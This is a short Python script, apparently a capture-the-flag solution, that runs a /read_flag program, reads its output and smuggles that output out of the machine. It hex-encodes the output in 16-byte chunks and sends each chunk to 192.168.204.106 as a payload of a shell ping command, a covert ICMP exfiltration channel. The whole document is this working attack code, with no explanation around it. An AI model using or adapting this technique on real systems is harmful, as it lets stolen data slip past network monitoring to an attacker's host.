import subprocess, binascii, time

p=subprocess.Popen(["/read_flag"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
p.stdin.write("Give me a...")
time.sleep(3)
p.stdin.write("... flag!")
time.sleep(.5)
while True:
    s=p.stdout.read()
    i=0
    while True:
        if i*16>len(s):
            break
        h=binascii.hexlify(s[16*i:16*i+16])
        subprocess.check_output('ping -c 1 -p '+h+' 192.168.204.106', shell=True)
        i+=1
